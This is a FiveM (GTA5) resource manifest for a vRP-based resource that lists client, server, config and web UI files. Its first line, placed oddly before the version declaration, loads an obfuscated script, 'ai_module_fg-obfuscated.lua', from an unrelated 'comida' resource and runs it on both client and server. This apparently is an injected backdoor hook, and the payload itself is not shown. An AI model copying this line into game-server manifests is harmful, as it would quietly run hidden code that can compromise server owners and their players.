shared_script '@comida/ai_module_fg-obfuscated.lua'
fx_version "bodacious"
game "gta5" 
ui_page_preload "yes"
ui_page "web-side/index.html"
client_scripts {
    "@vrp/lib/utils.lua",
    "client-side/*",
    "config-side/*"
}
server_scripts {
    "@vrp/lib/utils.lua",
    "server-side/*",
    "config-side/*"
}
files {
   "web-side/*",
   "web-side/**/*",
}                                          